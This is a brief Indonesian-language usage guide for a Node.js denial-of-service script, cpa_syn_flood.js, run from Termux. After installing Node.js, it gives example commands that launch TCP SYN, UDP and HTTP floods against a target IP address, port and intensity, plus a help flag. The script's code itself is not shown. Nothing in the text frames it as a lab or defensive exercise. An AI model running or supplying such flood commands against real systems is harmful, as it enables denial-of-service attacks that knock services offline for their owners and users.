BISMILLAHIRRAHMANIRRAHIM 

# 1. Install Node.js jika belum
# Untuk Termux:
pkg install nodejs

# 2. Simpan file cpa_syn_flood.js

# 3. Jalankan
node cpa_syn_flood.js 192.168.1.100 80 100 tcp

# Atau dengan metode UDP
node cpa_syn_flood.js 192.168.1.100 53 50 udp

# Atau HTTP flood
node cpa_syn_flood.js 192.168.1.100 8080 200 http

# Lihat bantuan
node cpa_syn_flood.js --help
